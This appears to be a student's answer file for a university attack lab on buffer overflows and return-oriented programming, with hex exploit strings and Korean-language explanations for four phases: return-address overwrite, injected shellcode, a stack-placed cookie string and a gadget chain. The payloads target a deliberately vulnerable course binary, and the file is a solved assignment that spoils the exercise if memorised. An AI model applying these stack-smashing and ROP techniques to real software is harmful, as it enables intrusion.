@@ -1,0 +1,112 @@
+시스템프로그래밍(2) 컴퓨터공학과 - 차경호
+Lab3 buffer overflow & Return-Oriented Programming
+
+=======================
+Phase 1 Answer
+-----------------------
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+8c 17 40 00 00 00 00 00
+-----------------------
+phase 1 Process
+1. getbuf에서 0x38 만큼 스택을 할당함을 파악
+2. buffer에서 0x38 이상의 값을 넣는다면 Stack Overflow 발생
+3. 결론적으로, Overflow를 통해 Return Address 값을 touch1 함수의 시작 주소로 변경
+4. Little Endian이기 때문에, 순서를 거꾸로 작성
+5. [./hex2raw < phase1Answer.txt > phase1Answer.raw]를 통해 작성한 파일의 raw 파일 획득
+6. [./ctarget -i phase1Answer.raw]를 통해 실행
+=======================
+
+
+=======================
+phase 2 Answer
+-----------------------
+bf e7 de 6a 27 68 b8 17
+40 00 c3 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 9d 61 55 00 00 00 00
+-----------------------
+phase 2 Process
+1. touch2 함수에서는 인자를 rdi를 통해 넘겨받음 -> rdi(edi)에 cookie 값을 넣어주고, touch2 함수를 호출하면 됨
+2. 명령어 작성 (touch2buf.s)
+	mov $0x276adee7, %edi : cookie 값을 edi에 넣음
+	pushq $0x00000000004017b8 : touch2 시작 주소를 PUSH, 이 다음 단계의 ret을 통해 touch2로 jmp 함
+	ret : touch2 함수를 호출
+3. [gcc -c touch2buf.s]를 통해 touch2buf.o 파일을 얻음
+4. [objdump -d touch2buf.o > touch2buf.txt]를 통해 기계어로 번환된 명령어들을 파악
+5. 위 결과들을 통해 Little Endian 방식으로 작성
+5. [./hex2raw < phase2Answer.txt > phase2Answer.raw]를 통해 작성한 파일의 raw 파일 획득
+6. [./ctarget -i phase2Answer.raw]를 통해 실행
+=======================
+
+
+=======================
+phase 3 Answer
+-----------------------
+bf 88 9d 61 55 68 8c 18
+40 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 9d 61 55 00 00 00 00
+32 37 36 61 64 35 65 37
+00
+-----------------------
+phase 3 Process
+1. phase 2와 달리 숫자가 아닌 문자열의 형태로 받기 때문에, cookie가 위치한 주솟값을 rdi에 전달해야 함을 파악
+2. [gdb ctarget] 후 getbuf와 getbuf의 두 번째 줄에 break를 걸고, 두 번째 줄까지 접근
+3. 접근한 후 [i r]을 통해 rsp(스택포인터) 값을 파악. 여기서 얻은 rsp 값인 0x55619d48은 스택의 첫 주소.
+4. buffer의 크기는 0x38, 스택의 첫 주소는 0x55619d48이므로, return address가 존재한 주소는 0x55619d48 + 0x38 = 0x55619d80이 됨
+5. [man ascii]를 통해 cookie 값을 바꾸면, 30(0), 78(x), 32(2), 37(7), 36(6), 61(a), 64(d), 65(e), 65(e), 37(7)임을 얻음
+6. 이와 동시에 return address 첫 부분에는 0x55619d80을 삽입하고, return address에 +8 한 부분에는 cookie를 삽입
+7. 이후 명령어를 작성 (touch3.s)
+	mov $0x55619ㅇ88, %edi : cookie 값을 edi에 넣음
+	pushq $0x000000000040188c : touch3 시작 주소를 PUSH. 이 다음 단계의 ret을 통해 touch3로 jmp 함
+	ret
+8. [gcc -c touch3.s]를 통해 touch3.o 파일을 얻음
+9. [objdump -d touch3.o]를 통해 기계어로 번환된 명령어들을 파악
+10. 위 결과들을 통해 Little Endian 방식으로 작성
+11. [./hex2raw < phase3Answer.txt > phase3Answer.raw]를 통해 작성한 파일의 raw 파일 획득
+12. [./ctarget -i phase3Answer.raw]를 통해 실행
+=======================
+
+
+=======================
+phase 4 Answer
+-----------------------
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+4c 19 40 00 00 00 00 00
+e7 de 6a 27 00 00 00 00
+22 19 40 00 00 00 00 00
+b8 17 40 00 00 00 00 00
+-----------------------
+phase 4 Process
+1. phase 2와 역할은 같으나, phase 2와 달리 스택의 주소가 실행할 때마다 변하기에 스택의 주소를 결정할 수 없으며, farm에서 Gadget을 모아 명령문을 만들고, 실행하는 것이 목적임을 파악
+2. [objdump -d rtarget > assamble2.txt] 후 [cat -n assamble2.txt]를 통해 rtarget을 파악
+3. phase 2에서 작성한 명령문과 동일한 역할을 해내는 Gadget을 선별
+	popq %rax : cookie 값을 rax로 옮기기 위해선 "58 c3"을 구해야 하는데, setval_451 안인 0x40194c에 "58 c3"가 존재함
+	movq %rax, %rdi : rax 값을 rdi로 옮기기 위해선 "48 89 c7"을 구해야 하는데, setval_212 안인 0x401922에 "48 89 c7 c3"가 존재함
+	결론적으로, [popq %rax] gadget은 0x40194c, [movq %rax, %rdi] gadget은 0x401922에 존재함을 파악
+4. popq %rax, cookie, movq %rax, %rdi, touch2 주소를 Little Endian 방식으로 작성
+11. [./hex2raw < phase4Answer.txt > phase4Answer.raw]를 통해 작성한 파일의 raw 파일 획득
+12. [./rtarget -i phase4Answer.raw]를 통해 실행
+=======================
